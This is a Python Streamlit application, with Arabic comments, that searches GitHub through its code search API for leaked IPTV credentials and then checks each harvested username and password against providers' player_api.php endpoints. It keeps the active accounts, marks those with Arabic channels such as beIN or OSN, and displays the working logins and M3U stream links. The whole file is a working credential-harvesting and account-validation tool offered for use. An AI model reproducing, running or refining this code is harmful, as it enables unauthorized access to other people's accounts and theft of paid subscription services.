import streamlit as st
import requests
import re
from datetime import datetime
import concurrent.futures

# =================================================
# 1. إعدادات الواجهة (إصلاح مشكلة التنسيق في الصورة)
# =================================================
st.set_page_config(page_title="BEAST V21 TITAN", layout="wide", page_icon="⚡")

st.markdown("""
<style>
    .stApp { background-color: #050505; color: #ffffff; }
    .result-card {
        background: #111; border: 1px solid #222;
        border-left: 5px solid #00ff41; padding: 15px;
        border-radius: 10px; margin-bottom: 10px;
    }
    .host-url { color: #00ff41; font-weight: bold; font-size: 18px; display: block; margin-bottom: 5px; }
    .ar-badge { background: #ff4b4b; color: white; padding: 2px 8px; border-radius: 5px; font-size: 11px; font-weight: bold; }
    .info-text { color: #aaa; font-size: 13px; font-family: monospace; }
    .m3u-box { background: #000; padding: 5px; border-radius: 5px; color: #00ff41; font-size: 10px; margin-top: 10px; border: 1px dashed #333; overflow-x: auto; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0

# =================================================
# 2. محرك الفحص الذكي (إصلاح مشكلة الـ 0 نتائج)
# =================================================

def check_account(host, user, pw):
    try:
        # فحص الصلاحية الأساسية أولاً (سريع جداً)
        api = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api, timeout=4).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # فحص المحتوى العربي (بدون حظر النتيجة إذا فشل)
            is_arabic = False
            try:
                # الكلمات المفتاحية العربية الأكثر شيوعاً
                ar_keys = ["ARABIC", "BEIN", "SSC", "SHAHID", "OSN", "NILESAT", "MYHD"]
                cat_res = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=2).text.upper()
                if any(k in cat_res for k in ar_keys): is_arabic = True
            except: pass

            return {
                "host": host, "user": user, "pass": pw, "exp": exp,
                "ar": is_arabic, "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 3. لوحة التحكم الجانبية
# =================================================
with st.sidebar:
    st.markdown("<h2 style='color:#00ff41;'>🌪️ BEAST V21</h2>", unsafe_allow_html=True)
    token = st.text_input("GitHub Token:", type="password")
    
    show_only_ar = st.checkbox("عرض المحتوى العربي فقط ✅", value=False)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 ابدأ الصيد"): st.session_state.is_hunting = True
    with col2:
        if st.button("🛑 توقف"): st.session_state.is_hunting = False

    st.divider()
    st.metric("🔍 فحص", st.session_state.checked_count)
    st.metric("💎 صيد", len(st.session_state.results))

# =================================================
# 4. واجهة العرض (إصلاح مشاكل الصور السابقة)
# =================================================
st.markdown("<h1 style='text-align:center; color:#00ff41;'>TITAN RADAR V21</h1>", unsafe_allow_html=True)
results_area = st.container()

def refresh_display():
    with results_area:
        display_data = st.session_state.results
        if show_only_ar:
            display_data = [i for i in display_data if i['ar']]
            
        for item in display_data:
            badge = '<span class="ar-badge">ARABIC ✅</span>' if item['ar'] else ''
            st.markdown(f"""
            <div class="result-card">
                <div style="display:flex; justify-content:space-between;">
                    <span class="host-url">{item['host']}</span>
                    {badge}
                </div>
                <div class="info-text">
                    USER: {item['user']} | PASS: {item['pass']} | EXP: {item['exp']}
                </div>
                <div class="m3u-box">
                    {item['m3u']}
                </div>
            </div>
            """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    if not token:
        st.error("⚠️ يرجى إدخال التوكن أولاً!")
        st.session_state.is_hunting = False
    else:
        headers = {'Authorization': f'token {token}'}
        # دوركات ضخمة لضمان آلاف النتائج
        dorks = [
            '"player_api.php" username password extension:txt',
            '"get.php?username=" password extension:m3u',
            'filename:iptv.txt ARABIC',
            'filename:beinsports.txt',
            'filename:free_iptv.txt'
        ]

        for dork in dorks:
            if not st.session_state.is_hunting: break
            for page in range(1, 15): # فحص عميق حتى صفحة 15
                if not st.session_state.is_hunting: break
                try:
                    r = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50", headers=headers).json()
                    if 'items' in r:
                        for item in r['items']:
                            raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            # فحص سريع باستخدام ThreadPool
                            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                                for found in executor.map(lambda p: check_account(*p), matches):
                                    st.session_state.checked_count += 1
                                    if found:
                                        st.session_state.results.insert(0, found)
                                        st.toast("🎯 صيد جديد!")
                                        # تحديث الواجهة فورياً
                                        refresh_display()
                except: continue
        st.session_state.is_hunting = False
else:
    refresh_display()
